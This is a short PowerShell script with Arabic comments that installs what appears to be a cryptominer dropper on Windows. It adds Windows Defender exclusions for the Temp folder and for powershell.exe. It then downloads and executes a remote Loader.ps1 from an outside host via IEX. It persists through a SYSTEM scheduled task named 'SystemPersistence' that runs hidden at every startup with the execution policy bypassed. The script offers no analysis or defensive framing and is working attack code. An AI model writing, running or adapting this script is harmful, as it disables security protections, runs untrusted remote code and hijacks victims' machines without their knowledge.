# 1. إنشاء ملف وسيط صغير يحتوي على كافة الأوامر الدفاعية والتنفيذية
$targetScript = 'C:\Windows\Temp\init.ps1'
$code = 'Add-MpPreference -ExclusionPath "C:\Windows\Temp" -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue; $lock = "C:\Windows\Temp\miner.lock"; if (!(Test-Path $lock)) { New-Item -Path $lock -ItemType File | Out-Null; try { IEX (New-Object Net.WebClient).DownloadString("https://blackpharoah666.online/Loader.ps1") } finally { Remove-Item $lock -ErrorAction SilentlyContinue } }'
$code | Out-File -FilePath $targetScript -Encoding ascii

# 2. إنشاء المهمة المجدولة التي تشير فقط إلى مسار الملف (هذا الأمر طوله أقل من 100 حرف)
schtasks /delete /tn "SystemPersistence" /f
schtasks /create /tn "SystemPersistence" /sc onstart /ru SYSTEM /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\init.ps1" /f
